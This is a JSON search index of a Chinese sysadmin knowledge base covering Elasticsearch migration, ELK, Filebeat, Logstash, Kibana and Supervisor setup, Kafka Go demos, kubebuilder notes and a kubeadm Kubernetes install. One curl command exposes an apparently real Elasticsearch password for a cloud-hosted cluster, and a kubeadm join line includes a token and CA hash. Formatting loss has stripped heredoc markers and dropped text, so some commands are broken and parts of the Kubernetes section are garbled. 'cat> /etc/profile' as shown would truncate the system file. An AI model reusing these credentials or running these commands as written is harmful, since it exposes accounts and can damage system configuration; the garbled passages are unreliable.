{"./":{"url":"./","title":"Introduction","keywords":"","body":"关于 author:运维知识库 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:21 "},"ElasitcSearch/":{"url":"ElasitcSearch/","title":"Elasitc Search","keywords":"","body":"ES Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-07-05 02:33:19 "},"ElasitcSearch/ES跨集群迁移.html":{"url":"ElasitcSearch/ES跨集群迁移.html","title":"ES跨集群迁移","keywords":"","body":"For Python # coding:utf-8 import sys import json import time,datetime from elasticsearch import Elasticsearch from elasticsearch.helpers import bulk from elasticsearch import helpers import time # example # python es_transfer.py '{\"es_source\":\"192.168.11.75:9200\",\"es_target\":\"192.168.11.9:9920\",\"source_index\":\"new_articles\",\"target_index\":\"new_articles\"}' start_time = time.time() data = sys.argv[1] data = json.loads(data) source_str = data['es_source'] target_str = data['es_target'] source_index = data['source_index'] target_index = data['target_index'] # auth username = 'elastic' password = '' es_source = Elasticsearch(source_str,timeout=500) es_target = Elasticsearch(target_str,http_auth=f\"{username}:{password}\", timeout=500) print('from ' + source_str + '\\\\' + source_index + ' to ' + target_str + '\\\\' + target_index) #build index mapping = es_source.indices.get_mapping(index=source_index) mapping = mapping[source_index]['mappings']['_doc'] try: # ----导入对应index的mapping（不需要可以注释）---- es_target.indices.create(index=target_index) es_target.indices.put_mapping(index=target_index,doc_type='_doc',body=mapping) #es_target.indices.put_mapping(index=target_index,doc_type=source_index,body=mapping) print(\"put mapping finish.\") # ----end---- body = {\"query\":{\"match_all\":{}}} #body = {\"size\":10000,\"query\":{\"terms\":{\"record_uid\":[\"1165829\"]}}} #body = {\"query\":{\"match_all\":{}},\"sort\":[{\"tkPaidTime\":{\"order\":\"desc\"}}]} #body = {\"query\":{\"bool\":{\"filter\":[{\"term\":{\"subsidyType\":\"饿了么\"}},{\"term\":{\"type\":1}}]}}} print(body) data = helpers.reindex(client=es_source,source_index=source_index,target_index=target_index,target_client=es_target,query=body,chunk_size=5000, scroll='15m') print('import finish') print(time.time() - start_time) except Exception as e: print(e) #if str(e) == \"RequestError(400, 'index_already_exists_exception', 'already exists')\": # print(\"index already exists\") # body={\"query\":{\"match_all\":{}}} # helpers.reindex(client=es_source,source_index=source_index,target_index=target_index,target_client=es_target,query=body,chunk_size=5000, scroll='15m') # print('import finish') Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-07-05 02:30:48 "},"ElasitcSearch/基础常用指令.html":{"url":"ElasitcSearch/基础常用指令.html","title":"基础常用指令","keywords":"","body":"查看所有索引 `curl -u username:password 'es:9200/_cat/indices?v'` 删除索引 curl -XDELETE -u username:password 'es:9200/dtk_dy_goods' 查看集群状态 `curl -XGET 'http://es:9200/_cluster/health?pretty'` 查看单个index的状态 `curl -XGET 'http://es:9200/_cluster/health/goods_id?pretty'` 查看线程池情况 `curl -XGET http://es:9200/_cat/GET /_cat/thread_pool/?v&h=id,name,active,rejected,completed,size,type&pretty&s=type` 查看哪个线程CPU利用率最高 `curl -XGET http://es:9200/_nodes/hot_threads` 查看es配置 `curl -XGET -u elastic:qingtaokeDB520 'es-cn-i7m2ro5fb000sl33h.elasticsearch.aliyuncs.com:9200/_settings/_all?pretty'` Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-07-20 11:27:31 "},"ELK/":{"url":"ELK/","title":"ELK","keywords":"","body":"ELK 7.7.1 ElasticSearch 单节点部署 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:17 "},"ELK/1.安装ElasticSearch7.7.1单节点.html":{"url":"ELK/1.安装ElasticSearch7.7.1单节点.html","title":"1.安装ElasticSearch7.7.1单节点","keywords":"","body":"准备工作 1、创建一个用于启动Elasticsearch的用户（elasticSearch不能使用root启动） # 新增用户 useradd elastic 2、安装jdk # 下载 wget https://download.oracle.com/otn/java/jdk/8u202-b08/1961070e4c9b4e26a04e7f5a083f551e/jdk-8u202-linux-x64.tar.gz?AuthParam=1591339121_67708d355c97bec3d5b8fb0e8ec7ff33 # 解压 tar xf jdk-8u202-linux-x64.tar.gz -C /usr/local/ && mv /usr/local/jdk-8u202-linux-x64 /usr/local/jdk # 写入环境变量 cat> /etc/profile export JAVA_HOME=/usr/local/jdk export JRE_HOME=/usr/local/jdk export PATH=$JAVA_HOME/bin:$JAVA_HOME/jre/bin:$PATH export CLASSPATH=$CLASS_PATH::$JAVA_HOME/lib:$JAVA_HOME/jre/lib EOF # 使环境变量生效 source /etc/profile # 验证 java -version ElasticSearch 安装 1、安装elasticsearch和配置 # 创建ELK 的安装目录 mkdir /usr/local/elk # 下载 ElasticSearch 7.7.1 wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.7.1-linux-x86_64.tar.gz # 解压 tar xf elasticsearch-7.7.1-linux-x86_64.tar.gz -C /usr/local/elk/ mv /usr/local/elk/elasticsearch-7.7.1-linux-x86_64 mv /usr/local/elk/elasticsearch-7.7.1 # 修改elasticsearch配置文件 [root@manager-1 config]# cat elasticsearch.yml | grep -v \"^#\" node.name: node-1 path.data: /data/es-data path.logs: /data/logs/es bootstrap.memory_lock: true network.host: 172.16.2.155 # 本机的IP http.port: 9200 discovery.seed_hosts: [\"172.16.2.155\"] cluster.initial_master_nodes: [\"172.16.2.155\"] 2、 为ES准备系统配置 # 创建elastic存储数据的目录 mkdir -p /data/es-data mkdir -p /data/logs/es # ES要要求vm.max_map_count的值至少为262144 echo vm.max_map_count= 262144 >> /etc/sysctl.conf sysctl -p # 配置文件打开数 cat > /etc/security/limits.conf * soft nofile 65535 * hard nofile 65535 * soft memlock unlimited * hard memlock unlimited EOF 3、 后台启动 /usr/local/elk/elasticsearch-7.7.1/bin/elasticsearch -d 日志路径在/data/logs/es/elasticsearch.log 4、 访问9200端口测试是否正常 [root@manager-1 config]# curl 172.16.2.155:9200 { \"name\" : \"node-1\", \"cluster_name\" : \"elasticsearch\", \"cluster_uuid\" : \"0EvqtzYsSYaSCkhnWYzVGg\", \"version\" : { \"number\" : \"7.7.1\", \"build_flavor\" : \"default\", \"build_type\" : \"tar\", \"build_hash\" : \"ad56dce891c901a492bb1ee393f12dfff473a423\", \"build_date\" : \"2020-05-28T16:30:01.040088Z\", \"build_snapshot\" : false, \"lucene_version\" : \"8.5.1\", \"minimum_wire_compatibility_version\" : \"6.8.0\", \"minimum_index_compatibility_version\" : \"6.0.0-beta1\" }, \"tagline\" : \"You Know, for Search\" } Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:17 "},"ELK/安装filbeat.html":{"url":"ELK/安装filbeat.html","title":"安装filbeat","keywords":"","body":"准备工作 # 创建filebeat安装目录 mkdir -p /usr/local/elk && cd 安装filbeat 1、下载filebeat wget https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-7.7.1-linux-x86_64.tar.gz tar xf filebeat-7.7.1-linux-x86_64.tar.gz -C /usr/loca/elk/ && mv /usr/local/elk/filebeat-7.7.1-linux-x86_64 /usr/local/elk/filebeat-7.7.1 2、 配置filebeat filebeat.inputs: - type: log enabled: true # 修改为true表示启用 paths: - /usr/local/server/kuaiban-app-*/logs/app1/*.log # 配置需要被收集的日志路径 - /var/log/*.log output.elasticsearch: hosts: [\"172.16.2.155:9200\"] # 配置elasticsearch 的地址 3、 前台启动filebeat（这里暂时前台启动看看是否正常，也可以配合nohup放入后台运行。文章后面会写通过supervisor管理进程） /usr/local/elk/filebeat-7.7.1/filebeat -e -c /usr/local/elk/filebeat-7.7.1/filebeat.yml 附加了解内容：filebeat进阶配置 1、java多行日志收集 例： multiline: pattern: '^\\s*(\\d{4}|\\d{2})\\-(\\d{2}|[a-zA-Z]{3})\\-(\\d{2}|\\d{4})' # 指定匹配的表达式 negate: true # 是否匹配到 match: after # 合并到上一行的末尾 max_lines: 1000 # 最大的行数 timeout: 10s # 如果在规定的时候没有新的日志事件就不等待后面的日志 fields: # 添加type字段 type: \"stdout\" 2、 自定义索引名（默认filebeat发送的数据会通过filebeat-*索引） output.elasticsearch: # Array of hosts to connect to. hosts: [\"172.16.2.155:9200\"] index: \"30test-environment-%{+yyyy.MM.dd}\" # 设置索引名，按天 setup.ilm.enabled: false # 必须加 setup.template.name: \"30test-environment\" setup.template.pattern: \"30test-environment-*\" 3、 解析json processors: - add_host_metadata: ~ - add_cloud_metadata: ~ - add_docker_metadata: ~ - add_kubernetes_metadata: ~ - decode_json_fields: # 解析json的配置，解析message子弹 fields: [\"message\"] process_array: false max_depth: 3 target: \"\" overwrite_keys: false add_error_key: true - rename: # json字段重命名 fields: - from: \"url\" to: \"request_url\" ignore_missing: false fail_on_error: true 4、 日志输出到logstash output.logstash: hosts: [\"172.16.2.155:5044\"] Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:17 "},"ELK/安装Kibana.html":{"url":"ELK/安装Kibana.html","title":"安装Kibana","keywords":"","body":"准备工作 1、创建安装目录 mkdir -p /usr/local/elk 安装kibana 1、下载并解压 wget https://artifacts.elastic.co/downloads/kibana/kibana-7.7.1-linux-x86_64.tar.gz tar xf kibana-7.7.1-linux-x86_64.tar.gz -C /usr/local/elk/ mv /usr/local/elk/kibana-7.7.1-linux-x86_64 /usr/local/elk/kibana-7.7.1 2、 配置kibana # cat /usr/local/elk/kibana-7.7.1-linux/config/kibana.yml | grep -v \"^#\" server.port: 5601 server.host: \"0.0.0.0\" # 本地的IP地址0.0.0.0监听所有本地地址 elasticsearch.hosts: [\"http://172.16.2.155:9200\"] # elasticsearch的地址和端口 3、 使用elastic用户启动kibana /usr/local/elk/kibana-7.7.1//bin/kibana 4、 浏览器登陆kibana web页面配置索引 浏览器打开http://172.16.2.155:5601/app/kibana IP替换为kibana服务器的IP 点击index patterns ---- Create index pattern --- 输入filebeat-* 匹配到filebeat发送到es的日志----next step ---- 完成 discover查看收集到的日志数据 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:17 "},"ELK/附加Logstash安装.html":{"url":"ELK/附加Logstash安装.html","title":"附加Logstash安装","keywords":"","body":"准备 1、安装目录准备 mkdir -p /usr/local/elk Logstash安装配置 1、下载解压Logstash wget https://artifacts.elastic.co/downloads/logstash/logstash-7.7.1.tar.gz tar xf logstash-7.7.1.tar.gz -C /usr/local/elk/ 2、 定义Logstash 配置文件 grok debug 网站：https://grokdebug.herokuapp.com/ > 一个示例： cat config/test.yml input { # 从5044端口接收数据 beats { port => 5044 } } filter { # 按照正则提取日志 grok { match => [ \"message\", \"%{TIMESTAMP_ISO8601:time}\\s*%{LOGLEVEL:loglevel}\\s*---\\s*(?.*?)\\s*:\\s*(?.*)\" ] } # 替换掉json数据前后的\"号 mutate { gsub => [ \"datainfo\", \"\\\"{\", \"{\", \"datainfo\", \"}\\\"\", \"}\" ] # 字段重命名 rename => [ \"host\", \"server\", \"method\", \"java_method\" ] # 移除字段 remove_field => [\"message\"] } # 解析json，并将解析的所有json放到 datainfo_group下 json { source => \"datainfo\" target => \"datainfo_group\" } } # 输出到elasticsearch output { elasticsearch { hosts => [\"172.16.2.155:9200\"] index => \"logstash-%{+YYYY.MM.dd}\" } } Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:17 "},"ELK/附加supervisor进程管理.html":{"url":"ELK/附加supervisor进程管理.html","title":"附加supervisor进程管理","keywords":"","body":"简介： 普通进程管理方案：比如filbeat 默认没有提供后台运行的选项，需要通过nohup或screen等方式放入后台，但是有些缺陷，比如日志管理，还需要单独通过logrotate或脚本单独去清理归档日志，进程自动重启等功能需要单独实现 Supervisor方案：Supervisor是用Python开发的一套通用的进程管理程序，能将一个普通的命令行进程变为后台daemon，并监控进程状态，异常退出时能自动重启，还提供了日志自动归档清理等功能。能更直观、方便的管理进程 安装并新增启动进程的用户 pip install supervisor # 创建用于存放日志和配置文件的目录 useradd elastic mkdir -p /etc/supervisord.d mkdir -p /var/log/supervisor 写入supervisord.conf 配置文件（文件为我自己总结的，根据需要修改） cat /etc/supervisord.conf [unix_http_server] file=/var/log/supervisor/supervisor.sock ; the path to the socket file ;chmod=0700 ; socket file mode (default 0700) ;chown=nobody:nogroup ; socket file uid:gid owner ;username=user ; default is no username (open server) ;password=123 ; default is no password (open server) ;[inet_http_server] ; inet (TCP) server disabled by default ;port=127.0.0.1:9001 ; ip_address:port specifier, *:port for all iface ;username=user ; default is no username (open server) ;password=123 ; default is no password (open server) [rpcinterface:supervisor] supervisor.rpcinterface_factory = supervisor.rpcinterface:make_main_rpcinterface [supervisord] logfile=/var/log/supervisor/supervisord.log ; main log file; default $CWD/supervisord.log logfile_maxbytes=50MB ; max main logfile bytes b4 rotation; default 50MB logfile_backups=10 ; # of main logfile backups; 0 means none, default 10 loglevel=info ; log level; default info; others: debug,warn,trace pidfile=/var/log/supervisor/supervisord.pid ; supervisord pidfile; default supervisord.pid nodaemon=false ; start in foreground if true; default false silent=false ; no logs to stdout if true; default false minfds=65535 ; min. avail startup file descriptors; default 1024 minprocs=65535 ; min. avail process descriptors;default 200 ;umask=022 ; process file creation umask; default 022 ;user=supervisord ; setuid to this UNIX account at startup; recommended if root ;identifier=supervisor ; supervisord identifier, default is 'supervisor' ;directory=/tmp ; default is not to cd during start ;nocleanup=true ; don't clean up tempfiles at start; default false ;childlogdir=/tmp ; 'AUTO' child log dir, default $TEMP ;environment=KEY=\"value\" ; key value pairs to add to environment ;strip_ansi=false ; strip ansi escape codes in logs; def. false [supervisorctl] serverurl=unix:///var/log/supervisor/supervisor.sock ; use a unix:// URL for a unix socket ;serverurl=http://127.0.0.1:9001 ; use an http:// url to specify an inet socket ;username=chris ; should be same as in [*_http_server] if set ;password=123 ; should be same as in [*_http_server] if set ;prompt=mysupervisor ; cmd line prompt (default \"supervisor\") ;history_file=~/.sc_history ; use readline history if available ;[program:theprogramname] ;command=/bin/cat ; the program (relative uses PATH, can take args) ;process_name=%(program_name)s ; process_name expr (default %(program_name)s) ;numprocs=1 ; number of processes copies to start (def 1) ;directory=/tmp ; directory to cwd to before exec (def no cwd) ;umask=022 ; umask for process (default None) ;priority=999 ; the relative start priority (default 999) ;autostart=true ; start at supervisord start (default: true) ;startsecs=1 ; # of secs prog must stay up to be running (def. 1) ;startretries=3 ; max # of serial start failures when starting (default 3) ;autorestart=unexpected ; when to restart if exited after running (def: unexpected) ;exitcodes=0 ; 'expected' exit codes used with autorestart (default 0) ;stopsignal=QUIT ; signal used to kill process (default TERM) ;stopwaitsecs=10 ; max num secs to wait b4 SIGKILL (default 10) ;stopasgroup=false ; send stop signal to the UNIX process group (default false) ;killasgroup=false ; SIGKILL the UNIX process group (def false) ;user=chrism ; setuid to this UNIX account to run the program ;redirect_stderr=true ; redirect proc stderr to stdout (default false) ;stdout_logfile=/a/path ; stdout log path, NONE for none; default AUTO ;stdout_logfile_maxbytes=1MB ; max # logfile bytes b4 rotation (default 50MB) ;stdout_logfile_backups=10 ; # of stdout logfile backups (0 means none, default 10) ;stdout_capture_maxbytes=1MB ; number of bytes in 'capturemode' (default 0) ;stdout_events_enabled=false ; emit events on stdout writes (default false) ;stdout_syslog=false ; send stdout to syslog with process name (default false) ;stderr_logfile=/a/path ; stderr log path, NONE for none; default AUTO ;stderr_logfile_maxbytes=1MB ; max # logfile bytes b4 rotation (default 50MB) ;stderr_logfile_backups=10 ; # of stderr logfile backups (0 means none, default 10) ;stderr_capture_maxbytes=1MB ; number of bytes in 'capturemode' (default 0) ;stderr_events_enabled=false ; emit events on stderr writes (default false) ;stderr_syslog=false ; send stderr to syslog with process name (default false) ;environment=A=\"1\",B=\"2\" ; process environment additions (def no adds) ;serverurl=AUTO ; override serverurl computation (childutils) ; The sample eventlistener section below shows all possible eventlistener ; subsection values. Create one or more 'real' eventlistener: sections to be ; able to handle event notifications sent by supervisord. ;[eventlistener:theeventlistenername] ;command=/bin/eventlistener ; the program (relative uses PATH, can take args) ;process_name=%(program_name)s ; process_name expr (default %(program_name)s) ;numprocs=1 ; number of processes copies to start (def 1) ;events=EVENT ; event notif. types to subscribe to (req'd) ;buffer_size=10 ; event buffer queue size (default 10) ;directory=/tmp ; directory to cwd to before exec (def no cwd) ;umask=022 ; umask for process (default None) ;priority=-1 ; the relative start priority (default -1) ;autostart=true ; start at supervisord start (default: true) ;startsecs=1 ; # of secs prog must stay up to be running (def. 1) ;startretries=3 ; max # of serial start failures when starting (default 3) ;autorestart=unexpected ; autorestart if exited after running (def: unexpected) ;exitcodes=0 ; 'expected' exit codes used with autorestart (default 0) ;stopsignal=QUIT ; signal used to kill process (default TERM) ;stopwaitsecs=10 ; max num secs to wait b4 SIGKILL (default 10) ;stopasgroup=false ; send stop signal to the UNIX process group (default false) ;killasgroup=false ; SIGKILL the UNIX process group (def false) ;user=chrism ; setuid to this UNIX account to run the program ;redirect_stderr=false ; redirect_stderr=true is not allowed for eventlisteners ;stdout_logfile=/a/path ; stdout log path, NONE for none; default AUTO ;stdout_logfile_maxbytes=1MB ; max # logfile bytes b4 rotation (default 50MB) ;stdout_logfile_backups=10 ; # of stdout logfile backups (0 means none, default 10) ;stdout_events_enabled=false ; emit events on stdout writes (default false) ;stdout_syslog=false ; send stdout to syslog with process name (default false) ;stderr_logfile=/a/path ; stderr log path, NONE for none; default AUTO ;stderr_logfile_maxbytes=1MB ; max # logfile bytes b4 rotation (default 50MB) ;stderr_logfile_backups=10 ; # of stderr logfile backups (0 means none, default 10) ;stderr_events_enabled=false ; emit events on stderr writes (default false) ;stderr_syslog=false ; send stderr to syslog with process name (default false) ;environment=A=\"1\",B=\"2\" ; process environment additions ;serverurl=AUTO ; override serverurl computation (childutils) ; The sample group section below shows all possible group values. Create one ; or more 'real' group: sections to create \"heterogeneous\" process groups. ;[group:thegroupname] ;programs=progname1,progname2 ; each refers to 'x' in [program:x] definitions ;priority=999 ; the relative start priority (default 999) ; The [include] section can just contain the \"files\" setting. This ; setting can list multiple files (separated by whitespace or ; newlines). It can also contain wildcards. The filenames are ; interpreted as relative to this file. Included files *cannot* ; include files themselves. [include] files = supervisord.d/*.conf EOF ElasticSearch 进程管理 cat /etc/supervisord.d/elasticsearch.conf [program:elasticsearch] directory = /usr/local/elk/elasticsearch-7.7.1/bin ; 程序的启动目录 command = /bin/bash elasticsearch ; 启动命令，与命令行启动的命令是一样的 autostart = true ; 在 supervisord 启动的时候也自动启动 startsecs = 5 ; 启动 5 秒后没有异常退出，就当作已经正常启动了 autorestart = true ; 程序异常退出后自动重启 startretries = 3 ; 启动失败自动重试次数，默认是 3 user = elastic ; 用哪个用户启动 redirect_stderr = true ; 把 stderr 重定向到 stdout，默认 false stdout_logfile_maxbytes = 20MB ; stdout 日志文件大小，默认 50MB stdout_logfile_backups = 10 ; stdout 日志文件备份数 ; stdout 日志文件，需要注意当指定目录不存在时无法正常启动，所以需要手动创建目录（supervisord 会自动创建日志文件） stdout_logfile = /var/log/elasticsearch.log ;日志统一放在log目录下 EOF kibana 进程管理 cat /etc/supervisord.d/kibana.conf [program:kibana] directory = /usr/local/elk/kibana-7.7.1/bin ; 程序的启动目录 command = sh kibana ; 启动命令，与命令行启动的命令是一样的 autostart = true ; 在 supervisord 启动的时候也自动启动 startsecs = 5 ; 启动 5 秒后没有异常退出，就当作已经正常启动了 autorestart = true ; 程序异常退出后自动重启 startretries = 3 ; 启动失败自动重试次数，默认是 3 user = elastic ; 用哪个用户启动 redirect_stderr = true ; 把 stderr 重定向到 stdout，默认 false stdout_logfile_maxbytes = 20MB ; stdout 日志文件大小，默认 50MB stdout_logfile_backups = 10 ; stdout 日志文件备份数 ; stdout 日志文件，需要注意当指定目录不存在时无法正常启动，所以需要手动创建目录（supervisord 会自动创建日志文件） stdout_logfile = /var/log/kibana.log ;日志统一放在log目录下 EOF Filbeat 进程管理 cat /etc/supervisord.d/filebeat.conf [program:filebeat] directory = /usr/local/elk/filebeat-7.7.1 ; 程序的启动目录 command = /usr/local/elk/filebeat-7.7.1/filebeat -e ; 启动命令，与命令行启动的命令是一样的 autostart = true ; 在 supervisord 启动的时候也自动启动 startsecs = 5 ; 启动 5 秒后没有异常退出，就当作已经正常启动了 autorestart = true ; 程序异常退出后自动重启 startretries = 3 ; 启动失败自动重试次数，默认是 3 user = root ; 用哪个用户启动 redirect_stderr = true ; 把 stderr 重定向到 stdout，默认 false stdout_logfile_maxbytes = 20MB ; stdout 日志文件大小，默认 50MB stdout_logfile_backups = 10 ; stdout 日志文件备份数 ; stdout 日志文件，需要注意当指定目录不存在时无法正常启动，所以需要手动创建目录（supervisord 会自动创建日志文件） stdout_logfile = /var/log/filebeat.log ;日志统一放在log目录下 EOF 启动等常用操作 启动 supervisord -c /etc/supervisord.conf 修改了配置文件重载 supervisorctl update supervisorctl stop programxxx，停止某一个进程(programxxx)，programxxx 为 [program:beepkg] 里配置的值，这个示例就是 beepkg。 supervisorctl start programxxx，启动某个进程。 supervisorctl restart programxxx，重启某个进程。 supervisorctl status，查看进程状态。 supervisorctl stop groupworker ，重启所有属于名为 groupworker 这个分组的进程(start,restart 同理)。 supervisorctl stop all，停止全部进程，注：start、restart、stop 都不会载入最新的配置文件。 supervisorctl reload，载入最新的配置文件，停止原有进程并按新的配置启动、管理所有进程。 supervisorctl update，根据最新的配置文件，启动新配置或有改动的进程，配置没有改动的进程不会受影响而重启。 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:17 "},"golang/":{"url":"golang/","title":"Golang","keywords":"","body":"Golang Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-07-05 02:30:48 "},"golang/kafka-demo.html":{"url":"golang/kafka-demo.html","title":"Kafka Demo","keywords":"","body":"producer示例 package main import ( \"context\" \"fmt\" \"github.com/segmentio/kafka-go\" \"log\" \"time\" ) func main() { // to produce message topic := \"my-topic\" partition := 0 conn, err := kafka.DialLeader(context.Background(), \"tcp\", \"192.168.14.81:9092\", topic, partition) if err != nil { log.Fatal(\"failed to dial leader:\", err) } conn.SetWriteDeadline(time.Now().Add(10 * time.Second)) c := 0 for { _, err := conn.WriteMessages( kafka.Message{Value: []byte(\"sdfhsjdhfjsd\")}, ) if err != nil { log.Fatal(err) } c = c + 1 fmt.Println(c) break } } consumer示例 package main import ( \"context\" \"fmt\" \"github.com/segmentio/kafka-go\" \"log\" ) func main() { r := kafka.NewReader(kafka.ReaderConfig{ Brokers: []string{\"192.168.16.3:9092\"}, GroupID: \"stream-load\", Topic: \"OrderPullTikTokShopProd\", MinBytes: 10e3, // 10KB MaxBytes: 10e6, // 10MB }) ctx := context.Background() for { m, err := r.FetchMessage(ctx) if err != nil { break } fmt.Printf(\"message at topic/partition/offset %v/%v/%v: %s = %s\\n\", m.Topic, m.Partition, m.Offset, string(m.Key), string(m.Value)) //if find := strings.Contains(string(m.Value), \"HI\"); find { // fmt.Println(string(m.Value)) //} if err := r.CommitMessages(ctx, m); err != nil { log.Fatal(\"failed to commit messages:\", err) } } if err := r.Close(); err != nil { log.Fatal(\"failed to close reader:\", err) } } Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-07-05 02:30:48 "},"K8S/":{"url":"K8S/","title":"K 8 S","keywords":"","body":"k8s操作 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:18 "},"K8S/client-go/":{"url":"K8S/client-go/","title":"Client Go","keywords":"","body":" Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-08-15 03:46:43 "},"K8S/client-go/doc.html":{"url":"K8S/client-go/doc.html","title":"Doc","keywords":"","body":"client类型 RESTclient: 最基础的客户端，提供最基础的封装 Clientset: 是client集合。包含所有的K8S内置资源 dynamicClient: 动态客户端，可以操作任意的K8S资源 Doscoveryclinet: 发现KS8提供的资源组，比如kubectl api-reousrces 就是使用了这个类型 核心组件 Reflector: list/watch api-serverDelta FIFO Queue: Reflector将list、atch数据加入队列Indexer/Cache: 缓存，数据会与Api server一致，缓解API Server压力，提供了GET/DELETE/LIST等方法存储pod对象。但是比如要获取某个Namespace下所有的POD，我们只能通过pod的对象再进行手动组装数据 Indexer可以通过indexers，indeces、index方法自动建立索引，来解决这个问题 sharedProcessor： WorkQueue： 通用队列、延迟队列、限速队列。通常直接使用限速队列 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-08-15 03:46:43 "},"K8S/kubebuilder/":{"url":"K8S/kubebuilder/","title":"Kubebuilder","keywords":"","body":" Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-08-15 03:46:43 "},"K8S/kubebuilder/Reconcile提取其他资源.html":{"url":"K8S/kubebuilder/Reconcile提取其他资源.html","title":"Reconcile提取其他资源","keywords":"","body":"获取huise名称空间下的所有deployment(client.InNamespace可以不指定) func (r *SnapshotReconciler) Reconcile(ctx context.Context, req ctrl.Request) (ctrl.Result, error) { log2 := log.FromContext(ctx) var dp appsv1.DeploymentList if err := r.Client.List(ctx, &dp, client.InNamespace(\"huise\")); err != nil { log2.Error(err, \"unable fetch dp\") } for _, v := range dp.Items { log2.Info(fmt.Sprintf(\"%s -- %s \\n\", v.Name, v.Namespace)) } eturn ctrl.Result{}, nil } 设置Annotations 为指定的资源设置Annotations，这简单且非常有用，比如控制器操作完资源后，应该添加一个Annotations，用于注释这个资源 已经被操作过了，避免控制器重复操作。 sp.SetAnnotations(map[string]string{\"Snapshot\": \"true\"}) 判断指定的资源是否存在 设置查询结构dpname，将查询结果绑定到dp var dp appsv1.Deployment for _, v := range res { log2.Info(fmt.Sprintf(\"%s -- %s=%s\", v.DpName, v.ContainerName, v.ContainerImage)) dpname := types.NamespacedName{ Namespace: v.NameSpace, Name: v.DpName, } if err := r.Get(ctx, dpname, &dp); err != nil { return ctrl.Result{}, nil 资源绑定删除 比如开发的控制器创建了一个svc和一个ingress，我们可以通过setownerreference关联这两个资源， 在删除这个GVK的时候，我们的所有资源都会一并自动删除 controllerutil.SetOwnerReference方法 更新资源 # 为spr对象设置了一个annotations，并将这个对象传给Update方法进行集群更新 spr.SetAnnotations(map[string]string{\"Snapshot\": \"true\"}) if err := r.Update(ctx, &spr); err != nil { return ctrl.Result{}, err } Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-08-15 03:46:43 "},"K8S/kubebuilder/开发环境准备工作.html":{"url":"K8S/kubebuilder/开发环境准备工作.html","title":"开发环境准备工作","keywords":"","body":"配置代理 由于很多资源和镜像均在google云或则其他外网资源上，为了方面开发，建议直接配置Docker代理，和build代理 创建一个目录，执行kubebuilder初始化目录kubebuilder init --domain itgod.org --repo itgod.org/dtk 由kubebuilder生成一个GVK的框架kubebuilder create api --group dtkapps --version v1 --kind SnapshotRollback 开始开发 参考 https://book.kubebuilder.io/，方便快速创建项目 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-08-15 03:46:43 "},"K8S/1、安装K8S.html":{"url":"K8S/1、安装K8S.html","title":"1、安装K8S","keywords":"","body":"阿里云的谷歌镜像仓库地址 registry.aliyuncs.com/google_containers 系统初始化： 设置主机名 hostnamectl set-hostname k8s-master001 mkdir /etc/yum.repos.d/bak mv /etc/yum.repos.d/Cent* /etc/yum.repos.d/bak/ wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo # 安装依赖包 yum install -y conntrack ntpdate ntp ipvsadm ipset jq iptables curl sysstat libseccomp wgetvimnet-tools git swapoff -a && sed -i '/ swap / s/^\\(.*\\)$/#\\1/g' /etc/fstab setenforce 0 && sed -i 's/^SELINUX=.*/SELINUX=disabled/' /etc/selinux/config cat > kubernetes.conf /etc/systemd/journald.conf.d/99-prophet.conf kubeadm 部署 docker 安装 yum install -y yum-utils device-mapper-persistent-data lvm2 ### 新增 Docker 仓库 yum-config-manager \\ --add-repo \\ http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo ## 安装 Docker CE. yum update && yum -y install docker-ce-18.06.2.ce ## 创建 /etc/docker 目录。 mkdir /etc/docker # 设置 daemon。 cat > /etc/docker/daemon.json 集群部署 cat /etc/yum.repos.d/kubernetes.repo [kubernetes] name=Kubernetes baseurl=http://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64 enabled=1 gpgcheck=0 repo_gpgcheck=0 gpgkey=http://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg http://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg EOF yum install -y kubelet kubeadm kubectl --disableexcludes=kubernetes systemctl enable --now kubelet # 查看初始化默认配置 kubeadm config print init-defaults > kubeadm-config.yaml kubeadm init --kubernetes-version=v1.19.2 \\ --control-plane-endpoint=172.16.1.125:9443 \\ --upload-certs \\ --apiserver-advertise-address=0.0.0.0 \\ --image-repository registry.aliyuncs.com/google_containers \\ --service-cidr=10.96.0.0/12 --pod-network-cidr=10.244.0.0/16 | tee kubeadm-init.log 节点加入集群 # 根据输出的提示信息，执行下面的命令 mkdir -p $HOME/.kube sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config sudo chown $(id -u):$(id -g) $HOME/.kube/config # 根据提示执行指定的命令 加入为master节点 或者 普通node节点 kubeadm join 172.16.5.30:6443 --token hjqed5.0ueiyniog0pzls6p \\ --discovery-token-ca-cert-hash sha256:c54d339dad7b57d7e1a2e9b5a0aded876b16a4e1eae4be1848f4d38864e804fa # 此时通过kubectl get node 状态是notready，需要安装网络插件 flannel kubectl apply -f https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml 取消污点，允许master部署pod kubectl 